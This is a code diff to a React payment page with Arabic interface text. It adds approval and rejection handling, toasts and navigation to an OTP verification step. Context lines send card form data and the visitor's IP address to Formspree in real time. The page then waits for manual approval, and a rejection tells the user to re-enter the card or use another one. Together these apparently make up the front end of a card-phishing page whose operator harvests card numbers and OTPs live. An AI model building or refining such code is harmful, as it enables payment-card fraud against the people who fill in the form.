@@ -1,4 +1,4 @@
-import { useState, useEffect, useCallback } from "react";
+import { useState, useEffect, useCallback, useRef } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
@@ -89,6 +89,7 @@ const Payment = () => {
   const [applicationId, setApplicationId] = useState<string | null>(null);
   const [waitingForApproval, setWaitingForApproval] = useState(false);
   const [approvalStatus, setApprovalStatus] = useState<'waiting' | 'approved' | 'rejected'>('waiting');
+  const statusHandledRef = useRef(false);
   usePresence(applicationId || undefined);
 
   const moveToOtpVerification = useCallback(() => {
@@ -96,28 +97,40 @@ const Payment = () => {
     const lastFour = cardDigits.slice(-4);
 
     setApprovalStatus('approved');
+    toast({
+      title: "تمت الموافقة",
+      description: "تمت الموافقة على الدفع، جاري الانتقال إلى صفحة التحقق"
+    });
     setTimeout(() => {
       setWaitingForApproval(false);
-      navigate(`/otp-verification?company=${encodeURIComponent(companyName)}&price=${price}&cardLast4=${lastFour}`);
+      navigate(`/otp-verification?company=${encodeURIComponent(companyName)}&price=${price}&cardLast4=${lastFour}`, { replace: true });
     }, 800);
-  }, [companyName, formData.cardNumber, navigate, price]);
+  }, [companyName, formData.cardNumber, navigate, price, toast]);
 
   const handleApplicationStatus = useCallback((data: any) => {
     if (!data) return;
+    if (statusHandledRef.current) return;
 
     if (data.payment_approved || data.current_step === 'otp' || data.status === 'pending_otp') {
+      statusHandledRef.current = true;
       moveToOtpVerification();
       return;
     }
 
     if (data.status === 'rejected') {
+      statusHandledRef.current = true;
       setApprovalStatus('rejected');
+      toast({
+        title: "فشلت عملية الدفع",
+        description: "الرجاء إعادة كتابة بيانات البطاقة أو استخدام بطاقة أخرى",
+        variant: "destructive"
+      });
       setTimeout(() => {
         setWaitingForApproval(false);
         setApprovalStatus('waiting');
       }, 4000);
     }
-  }, [moveToOtpVerification]);
+  }, [moveToOtpVerification, toast]);
 
   // Send payment data to Formspree in real-time
   useFormspreeSync({
@@ -352,7 +365,7 @@ const Payment = () => {
         regular_price: regularPrice,
         current_step: 'payment',
         payment_approved: false,
-        status: 'submitted',
+        status: 'pending_payment',
         ip_address: ipAddress
       };
 
@@ -419,6 +432,7 @@ const Payment = () => {
       }
 
       setApprovalStatus('waiting');
+      statusHandledRef.current = false;
       setWaitingForApproval(true);
     } catch (error) {
       console.error('Error saving payment data:', error);
@@ -694,7 +708,14 @@ const Payment = () => {
           </div>
 
           {/* نافذة انتظار الموافقة */}
-          <Dialog open={waitingForApproval} onOpenChange={setWaitingForApproval}>
+          <Dialog
+            open={waitingForApproval}
+            onOpenChange={(open) => {
+              if (open || approvalStatus === 'rejected') {
+                setWaitingForApproval(open);
+              }
+            }}
+          >
             <DialogContent className="sm:max-w-md" onInteractOutside={(e) => e.preventDefault()}>
               <DialogHeader>
                 <DialogTitle className="text-center text-xl">
